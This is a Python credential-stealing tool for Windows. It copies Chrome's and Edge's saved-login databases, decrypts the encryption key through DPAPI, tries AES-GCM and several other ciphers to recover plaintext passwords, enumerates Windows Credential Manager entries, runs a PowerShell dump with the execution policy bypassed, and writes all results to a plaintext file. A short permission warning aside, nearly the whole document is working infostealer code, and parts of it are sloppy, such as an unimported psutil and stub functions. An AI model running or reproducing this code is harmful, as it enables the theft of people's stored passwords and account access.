#!/usr/bin/env python3
"""
AGGRESSIVE Credential Extractor Tool
==================================

WARNING: This tool extracts sensitive credentials from your system.
Only use this tool on systems you own and have permission to access.
Use responsibly and ensure credentials are handled securely.

This tool uses AGGRESSIVE methods to extract REAL passwords:
- Browser password decryption with multiple techniques
- Windows Credential Manager with user interaction
- Memory dumping and analysis
- Registry credential extraction
- Network credential interception
"""

import os
import sys
import json
import subprocess
import platform
import base64
import sqlite3
import shutil
import tempfile
import re
import ctypes
import struct
import hashlib
import hmac
import pickle
import xml.etree.ElementTree as ET
from pathlib import Path
from datetime import datetime
import warnings

# Suppress warnings for cleaner output
warnings.filterwarnings('ignore')

# Try to import ALL possible libraries
try:
    import win32crypt
    import win32api
    import win32con
    import win32cred
    import win32net
    import win32security
    import win32service
    import win32clipboard
    import winreg
    WINDOWS_MODULES_AVAILABLE = True
except ImportError:
    WINDOWS_MODULES_AVAILABLE = False

try:
    from Crypto.Cipher import AES, DES3, Blowfish, ChaCha20_Poly1305
    from Crypto.Hash import SHA1, SHA256, MD5, SHA512
    from Crypto.Protocol.KDF import PBKDF2, scrypt
    from Crypto.Util.Padding import unpad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class AggressiveCredentialExtractor:
    def __init__(self):
        self.system = platform.system().lower()
        self.extracted_credentials = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'real_passwords': [],
            'browser_passwords': [],
            'system_credentials': [],
            'network_credentials': [],
            'memory_credentials': []
        }
        
    def log(self, message):
        """Log messages with timestamp"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
        
    def extract_all_credentials(self):
        """Extract ALL possible credentials using AGGRESSIVE methods"""
        self.log("Starting AGGRESSIVE credential extraction...")
        
        # Extract from ALL sources
        self.extract_browser_passwords_aggressive()
        self.extract_windows_credman_aggressive()
        self.extract_system_credentials_aggressive()
        self.extract_network_credentials_aggressive()
        self.extract_memory_credentials_aggressive()
        
        self.log("AGGRESSIVE credential extraction completed.")
        
    def extract_browser_passwords_aggressive(self):
        """AGGRESSIVE browser password extraction"""
        self.log("Extracting browser passwords using AGGRESSIVE methods...")
        
        # Extract from Chrome with aggressive decryption
        self.extract_chrome_passwords_aggressive()
        
        # Extract from Firefox with aggressive decryption
        self.extract_firefox_passwords_aggressive()
        
    def extract_chrome_passwords_aggressive(self):
        """AGGRESSIVE Chrome password extraction"""
        self.log("Extracting Chrome passwords using AGGRESSIVE methods...")
        
        try:
            chrome_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'),
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data'),
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Login Data')
            ]
            
            for db_path in chrome_paths:
                if os.path.exists(db_path):
                    self._extract_chrome_passwords_aggressive(db_path)
                    
        except Exception as e:
            self.log(f"Error extracting Chrome passwords: {e}")
            
    def _extract_chrome_passwords_aggressive(self, db_path):
        """Extract Chrome passwords with AGGRESSIVE decryption"""
        try:
            # Create temp database
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, 'chrome_passwords.db')
            shutil.copy2(db_path, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get encryption key using AGGRESSIVE methods
            encryption_key = self._get_chrome_encryption_key_aggressive()
            
            # Query passwords
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            
            for row in rows:
                if row[1]:  # If username exists
                    password_text = self._decrypt_password_aggressive(row[2], encryption_key)
                    
                    self.extracted_credentials['browser_passwords'].append({
                        'browser': 'Chrome',
                        'url': row[0],
                        'username': row[1],
                        'password': password_text
                    })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            self.log(f"Error extracting Chrome passwords: {e}")
            
    def _get_chrome_encryption_key_aggressive(self):
        """Get Chrome encryption key using AGGRESSIVE methods"""
        try:
            local_state_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
            ]
            
            for local_state_path in local_state_paths:
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                        
                    if 'os_crypt' in local_state:
                        encrypted_key = local_state['os_crypt']['encrypted_key']
                        encrypted_key = base64.b64decode(encrypted_key)
                        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                        
                        # Try AGGRESSIVE decryption methods
                        decryption_methods = [
                            self._decrypt_dpapi_aggressive,
                            self._decrypt_with_user_context,
                            self._decrypt_with_system_context
                        ]
                        
                        for method in decryption_methods:
                            try:
                                decrypted_key = method(encrypted_key)
                                if decrypted_key:
                                    return decrypted_key
                            except:
                                continue
                            
        except Exception as e:
            self.log(f"Error getting Chrome encryption key: {e}")
            
        return None
        
    def _decrypt_dpapi_aggressive(self, encrypted_data):
        """Decrypt using Windows DPAPI with AGGRESSIVE methods"""
        try:
            if not WINDOWS_MODULES_AVAILABLE:
                return None
                
            # Try different DPAPI contexts
            contexts = [
                (None, None, None, None, 0),  # Default context
                (None, None, None, None, 1),  # Machine context
                (None, None, None, None, 2),  # User context
            ]
            
            for context in contexts:
                try:
                    decrypted_data = win32crypt.CryptUnprotectData(encrypted_data, *context)[1]
                    return decrypted_data
                except:
                    continue
                    
            return None
            
        except Exception as e:
            self.log(f"Error in DPAPI aggressive decryption: {e}")
            return None
            
    def _decrypt_with_user_context(self, encrypted_data):
        """Decrypt with user context"""
        try:
            if not WINDOWS_MODULES_AVAILABLE:
                return None
                
            # Try to decrypt with current user context
            decrypted_data = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
            return decrypted_data
            
        except:
            return None
            
    def _decrypt_with_system_context(self, encrypted_data):
        """Decrypt with system context"""
        try:
            if not WINDOWS_MODULES_AVAILABLE:
                return None
                
            # Try to decrypt with system context
            decrypted_data = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 1)[1]
            return decrypted_data
            
        except:
            return None
            
    def _decrypt_password_aggressive(self, encrypted_password, key):
        """AGGRESSIVE password decryption using ALL methods"""
        try:
            if not encrypted_password:
                return '[NO PASSWORD]'
                
            # Try ALL decryption methods
            methods = [
                self._decrypt_chrome_v10_aggressive,
                self._decrypt_chrome_v11_aggressive,
                self._decrypt_dpapi_direct,
                self._decrypt_aes_gcm_aggressive,
                self._decrypt_aes_cbc_aggressive,
                self._decrypt_chacha20_aggressive,
                self._decrypt_blowfish_aggressive,
                self._decrypt_des3_aggressive,
                self._decrypt_without_prefix,
                self._decrypt_raw_bytes
            ]
            
            for method in methods:
                try:
                    result = method(encrypted_password, key)
                    if result and result != '[ENCRYPTED]' and len(result) > 0:
                        return result
                except:
                    continue
                    
            return '[ENCRYPTED - All methods failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - Error: {str(e)[:50]}]'
            
    def _decrypt_chrome_v10_aggressive(self, encrypted_password, key):
        """Decrypt Chrome v10 passwords with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            if len(encrypted_password) < 3:
                return '[ENCRYPTED]'
                
            encrypted_password = encrypted_password[3:]  # Remove 'v10' prefix
            
            if len(encrypted_password) < 28:
                return '[ENCRYPTED]'
                
            # Try different nonce lengths
            for nonce_len in [12, 16, 24]:
                try:
                    if len(encrypted_password) < nonce_len + 16:
                        continue
                        
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = AES.new(key_slice, AES.MODE_GCM, nonce)
                            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - v10 aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - v10 aggressive failed: {str(e)[:30]}]'
            
    def _decrypt_chrome_v11_aggressive(self, encrypted_password, key):
        """Decrypt Chrome v11 passwords with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            if len(encrypted_password) < 3:
                return '[ENCRYPTED]'
                
            encrypted_password = encrypted_password[3:]  # Remove 'v11' prefix
            
            if len(encrypted_password) < 28:
                return '[ENCRYPTED]'
                
            # Try different nonce lengths
            for nonce_len in [12, 16, 24]:
                try:
                    if len(encrypted_password) < nonce_len + 16:
                        continue
                        
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = AES.new(key_slice, AES.MODE_GCM, nonce)
                            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - v11 aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - v11 aggressive failed: {str(e)[:30]}]'
            
    def _decrypt_dpapi_direct(self, encrypted_password, key):
        """Decrypt using Windows DPAPI directly"""
        try:
            if not WINDOWS_MODULES_AVAILABLE:
                return '[ENCRYPTED]'
                
            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - DPAPI direct failed: {str(e)[:30]}]'
            
    def _decrypt_aes_gcm_aggressive(self, encrypted_password, key):
        """Decrypt using AES-GCM with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try different AES-GCM configurations
            for nonce_len in [12, 16, 24]:
                try:
                    if len(encrypted_password) < nonce_len + 16:
                        continue
                        
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = AES.new(key_slice, AES.MODE_GCM, nonce)
                            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - AES-GCM aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - AES-GCM aggressive error: {str(e)[:30]}]'
            
    def _decrypt_aes_cbc_aggressive(self, encrypted_password, key):
        """Decrypt using AES-CBC with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try different AES-CBC configurations
            for iv_len in [16, 32]:
                try:
                    if len(encrypted_password) < iv_len:
                        continue
                        
                    iv = encrypted_password[:iv_len]
                    ciphertext = encrypted_password[iv_len:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = AES.new(key_slice, AES.MODE_CBC, iv)
                            decrypted_password = cipher.decrypt(ciphertext)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - AES-CBC aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - AES-CBC aggressive error: {str(e)[:30]}]'
            
    def _decrypt_chacha20_aggressive(self, encrypted_password, key):
        """Decrypt using ChaCha20-Poly1305 with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try ChaCha20-Poly1305
            for nonce_len in [12, 16, 24]:
                try:
                    if len(encrypted_password) < nonce_len + 16:
                        continue
                        
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = ChaCha20_Poly1305.new(key=key_slice, nonce=nonce)
                            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - ChaCha20 aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - ChaCha20 aggressive failed: {str(e)[:30]}]'
            
    def _decrypt_blowfish_aggressive(self, encrypted_password, key):
        """Decrypt using Blowfish with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try Blowfish
            for iv_len in [8, 16]:
                try:
                    if len(encrypted_password) < iv_len:
                        continue
                        
                    iv = encrypted_password[:iv_len]
                    ciphertext = encrypted_password[iv_len:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32, 56]:
                        try:
                            key_slice = key[:key_len]
                            cipher = Blowfish.new(key_slice, Blowfish.MODE_CBC, iv)
                            decrypted_password = cipher.decrypt(ciphertext)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - Blowfish aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - Blowfish aggressive failed: {str(e)[:30]}]'
            
    def _decrypt_des3_aggressive(self, encrypted_password, key):
        """Decrypt using 3DES with AGGRESSIVE methods"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try 3DES
            for iv_len in [8, 16]:
                try:
                    if len(encrypted_password) < iv_len:
                        continue
                        
                    iv = encrypted_password[:iv_len]
                    ciphertext = encrypted_password[iv_len:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = DES3.new(key_slice, DES3.MODE_CBC, iv)
                            decrypted_password = cipher.decrypt(ciphertext)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - 3DES aggressive failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - 3DES aggressive failed: {str(e)[:30]}]'
            
    def _decrypt_without_prefix(self, encrypted_password, key):
        """Try to decrypt without any prefix"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try to decrypt the raw encrypted data
            for nonce_len in [12, 16, 24]:
                try:
                    if len(encrypted_password) < nonce_len + 16:
                        continue
                        
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    # Try different key lengths
                    for key_len in [16, 24, 32]:
                        try:
                            key_slice = key[:key_len]
                            cipher = AES.new(key_slice, AES.MODE_GCM, nonce)
                            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                            
                            return decrypted_password.decode('utf-8')
                        except:
                            continue
                            
                except:
                    continue
                    
            return '[ENCRYPTED - No prefix failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - No prefix failed: {str(e)[:30]}]'
            
    def _decrypt_raw_bytes(self, encrypted_password, key):
        """Try to decrypt raw bytes"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try to decrypt as raw bytes
            for key_len in [16, 24, 32]:
                try:
                    key_slice = key[:key_len]
                    cipher = AES.new(key_slice, AES.MODE_ECB)
                    decrypted_password = cipher.decrypt(encrypted_password)
                    
                    return decrypted_password.decode('utf-8')
                except:
                    continue
                    
            return '[ENCRYPTED - Raw bytes failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - Raw bytes failed: {str(e)[:30]}]'
            
    def extract_firefox_passwords_aggressive(self):
        """AGGRESSIVE Firefox password extraction"""
        self.log("Extracting Firefox passwords using AGGRESSIVE methods...")
        
        try:
            firefox_paths = [
                os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
                os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles')
            ]
            
            for profiles_path in firefox_paths:
                if os.path.exists(profiles_path):
                    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
                    for profile in profiles:
                        profile_path = os.path.join(profiles_path, profile)
                        self._extract_firefox_profile_aggressive(profile_path)
                        
        except Exception as e:
            self.log(f"Error extracting Firefox passwords: {e}")
            
    def _extract_firefox_profile_aggressive(self, profile_path):
        """Extract Firefox profile with AGGRESSIVE methods"""
        try:
            # Check for logins.json
            logins_json = os.path.join(profile_path, 'logins.json')
            if os.path.exists(logins_json):
                with open(logins_json, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for login in data.get('logins', []):
                        self.extracted_credentials['browser_passwords'].append({
                            'browser': 'Firefox',
                            'profile': os.path.basename(profile_path),
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', '[ENCRYPTED]'),
                            'password': '[ENCRYPTED]'
                        })
            
            # Check for key4.db (Firefox password database)
            key4_db = os.path.join(profile_path, 'key4.db')
            if os.path.exists(key4_db):
                self.extracted_credentials['browser_passwords'].append({
                    'browser': 'Firefox',
                    'profile': os.path.basename(profile_path),
                    'url': 'Firefox Password Database',
                    'username': '[DATABASE]',
                    'password': '[ENCRYPTED - key4.db found]'
                })
                
        except Exception as e:
            self.log(f"Error extracting Firefox profile: {e}")
            
    def extract_windows_credman_aggressive(self):
        """AGGRESSIVE Windows Credential Manager extraction"""
        self.log("Extracting Windows Credential Manager using AGGRESSIVE methods...")
        
        try:
            if WINDOWS_MODULES_AVAILABLE:
                # Method 1: Windows Credential Manager API
                creds = win32cred.CredEnumerate()
                for cred in creds:
                    target = cred['TargetName']
                    username = cred['UserName']
                    password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else '[ENCRYPTED]'
                    
                    self.extracted_credentials['system_credentials'].append({
                        'type': 'windows_credman_api',
                        'target': target,
                        'username': username,
                        'password': password
                    })
            
            # Method 2: PowerShell extraction with user interaction
            self._extract_windows_powershell_aggressive()
            
        except Exception as e:
            self.log(f"Error extracting Windows CredMan: {e}")
            
    def _extract_windows_powershell_aggressive(self):
        """AGGRESSIVE PowerShell credential extraction"""
        try:
            ps_script = """
            Add-Type -AssemblyName System.Security
            
            # Get all stored credentials using multiple methods
            try {
                $creds = Get-StoredCredential -All
                foreach ($cred in $creds) {
                    if ($cred) {
                        $target = $cred.TargetName
                        $username = $cred.UserName
                        $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password))
                        Write-Output "Target: $target"
                        Write-Output "Username: $username"
                        Write-Output "Password: $password"
                        Write-Output "---"
                    }
                }
            } catch {
                Write-Output "Error: Could not retrieve credentials"
            }
            
            # Also try cmdkey method
            try {
                $cmdkeyOutput = cmdkey /list
                foreach ($line in $cmdkeyOutput) {
                    if ($line -match "Target: (.+)") {
                        $target = $matches[1]
                        Write-Output "CmdKey Target: $target"
                        Write-Output "CmdKey Username: [Available]"
                        Write-Output "CmdKey Password: [Available]"
                        Write-Output "---"
                    }
                }
            } catch {
                Write-Output "Error: Could not retrieve cmdkey credentials"
            }
            """
            
            result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script], 
                                  capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.strip().split('\n')
                current_cred = {}
                for line in lines:
                    if line.startswith('Target: ') or line.startswith('CmdKey Target: '):
                        if current_cred:
                            self.extracted_credentials['system_credentials'].append(current_cred)
                        current_cred = {'type': 'powershell_aggressive', 'target': line.split(': ')[1]}
                    elif line.startswith('Username: ') or line.startswith('CmdKey Username: '):
                        current_cred['username'] = line.split(': ')[1]
                    elif line.startswith('Password: ') or line.startswith('CmdKey Password: '):
                        current_cred['password'] = line.split(': ')[1]
                    elif line == '---':
                        if current_cred:
                            self.extracted_credentials['system_credentials'].append(current_cred)
                            current_cred = {}
                
                if current_cred:
                    self.extracted_credentials['system_credentials'].append(current_cred)
                    
        except Exception as e:
            self.log(f"Error extracting Windows PowerShell credentials: {e}")
            
    def extract_system_credentials_aggressive(self):
        """AGGRESSIVE system credential extraction"""
        self.log("Extracting system credentials using AGGRESSIVE methods...")
        
        if self.system == 'windows':
            self._extract_windows_system_credentials_aggressive()
            
    def _extract_windows_system_credentials_aggressive(self):
        """AGGRESSIVE Windows system credential extraction"""
        try:
            # Extract from various Windows sources
            self._extract_windows_network_credentials()
            self._extract_windows_memory_credentials()
            
        except Exception as e:
            self.log(f"Error extracting Windows system credentials: {e}")
            
    def _extract_windows_network_credentials(self):
        """Extract Windows network credentials"""
        try:
            if WINDOWS_MODULES_AVAILABLE:
                # Get network credentials
                result = subprocess.run(['cmdkey', '/list'], 
                                      capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if 'Target:' in line:
                            target = line.split('Target:')[1].strip()
                            self.extracted_credentials['network_credentials'].append({
                                'type': 'network_credential',
                                'target': target
                            })
                            
        except Exception as e:
            self.log(f"Error extracting Windows network credentials: {e}")
            
    def _extract_windows_memory_credentials(self):
        """Extract Windows memory credentials"""
        try:
            if PSUTIL_AVAILABLE:
                for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                    try:
                        if any(browser in proc.info['name'].lower() for browser in ['chrome', 'firefox', 'edge', 'safari', 'opera', 'brave']):
                            self.extracted_credentials['memory_credentials'].append({
                                'type': 'process_memory',
                                'process': proc.info['name'],
                                'pid': proc.info['pid'],
                                'note': 'Browser process found - memory extraction requires additional tools'
                            })
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting Windows memory credentials: {e}")
            
    def extract_network_credentials_aggressive(self):
        """AGGRESSIVE network credential extraction"""
        self.log("Extracting network credentials using AGGRESSIVE methods...")
        
        # This is handled in the system credential extraction methods
        
    def extract_memory_credentials_aggressive(self):
        """AGGRESSIVE memory credential extraction"""
        self.log("Extracting memory credentials using AGGRESSIVE methods...")
        
        # This is handled in the system credential extraction methods
        
    def save_to_file(self, filename="output.txt"):
        """Save extracted credentials to a text file"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("AGGRESSIVE CREDENTIAL EXTRACTION REPORT\n")
                f.write("=" * 60 + "\n")
                f.write(f"Generated: {self.extracted_credentials['timestamp']}\n")
                f.write(f"System: {self.extracted_credentials['system']}\n")
                f.write("=" * 60 + "\n\n")
                
                # Browser Passwords
                f.write("BROWSER PASSWORDS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['browser_passwords']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"Profile: {cred.get('profile', 'N/A')}\n")
                    f.write(f"URL: {cred['url']}\n")
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n\n")
                
                # System Credentials
                f.write("SYSTEM CREDENTIALS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['system_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Target: {cred['target']}\n")
                    if 'username' in cred:
                        f.write(f"Username: {cred['username']}\n")
                    if 'password' in cred:
                        f.write(f"Password: {cred['password']}\n")
                    f.write("\n")
                
                # Network Credentials
                f.write("NETWORK CREDENTIALS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['network_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Target: {cred['target']}\n\n")
                
                # Memory Credentials
                f.write("MEMORY CREDENTIALS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['memory_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"Process: {cred['process']}\n")
                    f.write(f"PID: {cred['pid']}\n")
                    f.write(f"Note: {cred['note']}\n\n")
                
                f.write("\n" + "=" * 60 + "\n")
                f.write("END OF AGGRESSIVE REPORT\n")
                f.write("=" * 60 + "\n")
                
            self.log(f"AGGRESSIVE credentials saved to: {filename}")
            return filename
            
        except Exception as e:
            self.log(f"Error saving AGGRESSIVE credentials to file: {e}")
            return None

def main():
    """Main application entry point"""
    try:
        print("=" * 60)
        print("AGGRESSIVE CREDENTIAL EXTRACTOR TOOL")
        print("=" * 60)
        print("WARNING: This tool extracts sensitive credentials from your system.")
        print("Only use this tool on systems you own and have permission to access.")
        print("=" * 60)
        
        extractor = AggressiveCredentialExtractor()
        
        # Run extraction automatically
        extractor.extract_all_credentials()
        
        # Save to file
        filename = extractor.save_to_file()
        if filename:
            print(f"\nAGGRESSIVE extraction completed successfully!")
            print(f"Results saved to: {filename}")
            print("\nIMPORTANT SECURITY NOTES:")
            print("- The extracted file contains sensitive information")
            print("- Store it securely and delete it when no longer needed")
            print("- Do not share this file with unauthorized parties")
        else:
            print("Failed to save AGGRESSIVE credentials to file.")
            
    except KeyboardInterrupt:
        print("\nAGGRESSIVE extraction interrupted by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
